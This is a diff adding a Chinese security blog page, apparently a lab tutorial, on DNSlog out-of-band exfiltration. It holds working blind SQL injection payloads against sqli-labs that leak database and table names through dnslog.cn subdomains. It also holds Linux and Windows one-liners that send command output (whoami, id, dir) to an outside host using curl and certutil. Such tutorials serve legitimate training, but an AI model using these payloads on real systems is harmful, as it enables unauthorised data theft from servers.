@@ -1,0 +1,325 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1704635108417">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1704635108417" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#dnslog%E7%9A%84%E4%BD%BF%E7%94%A8">DNSlog的使用</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">应用场景</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0">使用到的函数</a></li>
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a></li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96dns%E5%9F%9F%E5%90%8D">获取DNS域名</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E5%BC%80%E5%A7%8B">注入开始</a></li>
+</ul>
+</li>
+<li><a href="#%E6%90%AD%E5%BB%BAdnslog%E6%9C%8D%E5%8A%A1%E5%99%A8">搭建DNSlog服务器</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97">使用中间件日志</a><br>
+*
+<ul>
+<li><a href="#linux">Linux</a></li>
+<li><a href="#windows">windows</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">DNSlog的使用</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-20 / 4 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="dnslog的使用">DNSlog的使用</h1>
+<h2 id="原理">原理</h2>
+<p>DNS服务器解析域名的时候会留下log日志，如果DNS服务器是自己的，那么我们就可以从log信息中获得信息</p>
+<h2 id="应用场景">应用场景</h2>
+<p>1、SQL注入中的盲注</p>
+<p>2、无回显的命令执行</p>
+<p>3、无回显的SSRF</p>
+<h2 id="使用到的函数">使用到的函数</h2>
+<p>load_file()函数</p>
+<p>load_file()使用限制：</p>
+<p>1.文件必须位于服务器主机上。</p>
+<p>2.当前用户必须具有读取文件的权限</p>
+<pre><code>select * from mysql.user where user='user_name';
+</code></pre>
+<p>3.文件的大小小于max_allowed_packet字节。（暂时不清楚实际渗透过程中会不会遇到</p>
+<p>4.读取的文件位于secure_file_priv设置的范围内</p>
+<pre><code>SHOW VARIABLES LIKE 'secure_file_priv';
+</code></pre>
+<p>Q：为什么要用load_file函数呢？</p>
+<p>A：因为load_file函数可以解析dns请求。</p>
+<p>数据库中使用此payload：select load_file('\\SQL注入查询语句.a.com')</p>
+<p>注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。</p>
+<h2 id="环境">环境</h2>
+<p>dnslog.cn</p>
+<p>sqli-labs-Less-5</p>
+<h2 id="实践">实践</h2>
+<p>判断存在注入，并且无明显回显，这里我们考虑下使用DNSlog</p>
+<h3 id="获取dns域名">获取DNS域名</h3>
+<p>先访问<a href="dnslog.cn">dnslog.cn</a>，谷歌浏览器，似乎需要翻墙</p>
+<p>获得一个域名</p>
+<p>这里我获得的域名是：4325u7.dnslog.cn</p>
+<h3 id="注入开始">注入开始</h3>
+<p>payload：</p>
+<pre><code>http://127.0.0.1/sqli-lab/Less-5/?id=1' and if((select load_file(concat('\\\\',(select database()),'.4325u7.dnslog.cn\\aaa'))),1,1)--+
+</code></pre>
+<p>页面会加载一会儿，可能是网络原因</p>
+<p>查看DNSlog信息</p>
+<figure data-type="image" tabindex="1"><img src="https://xssong17.github.io/post-images/dnslog/QQ%E6%88%AA%E5%9B%BE20210420150952.png" alt="QQ截图20210420150952" loading="lazy"></figure>
+<p>可以看到，数据库名信息就会放到和域名信息一起被记录到DNSlog里面了</p>
+<p>查看表名</p>
+<pre><code>' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.4325u7.dnslog.cn\\aaa'))),1,1)--+
+</code></pre>
+<p>……</p>
+<h2 id="搭建dnslog服务器">搭建DNSlog服务器</h2>
+<p>这⾥推荐BugScanTeam的 https://github.com/BugScanTeam/DNSLog ，该项⽬主页是有搭建教程的，按⾃⼰的 需求搭建。</p>
+<h2 id="使用中间件日志">使用中间件日志</h2>
+<p>除了DNS的log，在可以执⾏系统命令的情况还可以利⽤HTTP的log，就是通过<strong>中间件的⽇志</strong>来获取结果。</p>
+<h4 id="linux">Linux</h4>
+<pre><code>for /F &quot;delims=\&quot; %i in ('whoami') do curl https://www.yourweb.net/%i 
+</code></pre>
+<p>如果碰到内容有空格（换⾏符等），就会截断，只输出前⾯的，这时候可以利⽤编码来输出，但有输出字符数最⼤ 限制；</p>
+<pre><code>curl http://xxx.dnslog.link/$(id|base64)
+curl http://xxx.dnslog.link/`id|base64`
+</code></pre>
+<h4 id="windows">windows</h4>
+<p>#启动浏览器访问</p>
+<pre><code>for /F %x in ('whoami') do start https://yourweb.net/%x
+</code></pre>
+<p>#内置命令⾏⼯具访问</p>
+<pre><code>for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.yourweb.net/%x
+</code></pre>
+<p>#只列出⽂件名</p>
+<pre><code>for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.yourweb.net/%x
+</code></pre>
+<p>windows下的base64编码</p>
+<p>暂时未找到能直接像Linux那样可以通过管道来加密的，但通过多次命令的执⾏达到先base64加密，再做HTTP请求</p>
+<pre><code>whoami &gt; result.txt
+certutil -encode result.txt result_bs64
+for /f %x in (result_bs64) do certutil.exe -urlcache -split -f http://www.yourweb.net/%x
+</code></pre>
+<p>每⼀个请求都会出现两个请求⽇志，所以要去重复！</p>
+<p>并把结果保存为result_bs64_local ，然后再把这个result_bs64_local ⾥⾯加密的⽂件内容解密，命令为：</p>
+<pre><code>certutil -decode result_bs64_local result_local.txt
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>参考文章：</p>
+<p>https://www.cnblogs.com/sunny11/p/14399420.html</p>
+<p>后续需要看:</p>
+<p><a href="https://www.cnblogs.com/sunny11/p/14522023.html">Getshell的姿势总结</a></p>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/chang-jian-web-lou-dong-fang-yu-cuo-shi-hui-zong/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  常见web漏洞防御措施汇总
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/sqlmap-de-shi-jian-yu-zong-jie/">
+                <h3 class="post-title">
+                  sqlmap的实践与总结
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
